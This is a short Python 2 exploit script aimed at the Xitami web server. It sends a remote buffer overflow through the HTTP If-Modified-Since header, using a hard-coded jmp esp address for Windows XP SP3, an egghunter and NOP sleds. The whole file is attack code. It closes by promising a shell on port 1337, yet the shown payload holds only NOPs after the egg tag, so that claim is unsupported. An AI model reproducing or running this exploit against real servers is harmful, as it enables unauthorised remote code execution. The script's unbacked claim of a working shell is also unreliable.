import time
import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

egghunt = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"w00t" # 4 byte tag
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

jump = "\xeb\x22" # short jump

buf = "A" * 72                  
buf += "\xD7\x30\x9D\x7C" # jmp esp (user32.dll) / XP SP3 English
buf += jump
buf += "\x90" * 50
buf += egghunt
buf += "w00tw00t" # tag
buf += "\x90" * 50

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"